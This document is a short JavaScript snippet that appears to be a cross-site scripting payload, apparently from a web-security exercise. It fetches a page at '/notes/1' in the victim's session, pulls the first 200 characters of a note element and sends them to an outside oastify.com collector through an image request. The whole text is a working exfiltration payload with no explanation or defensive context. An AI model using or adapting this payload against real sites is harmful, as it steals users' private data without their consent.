fetch('/notes/1').then(r=>r.text()).then(d=>{
  let content = (new DOMParser()).parseFromString(d,'text/html').querySelector('div.mt-6').innerHTML.substring(0,200);
  new Image().src = 'https://66an85cubmljzetr1e0ebgqzuq0hoec3.oastify.com/collect?data='+encodeURIComponent(content);
})
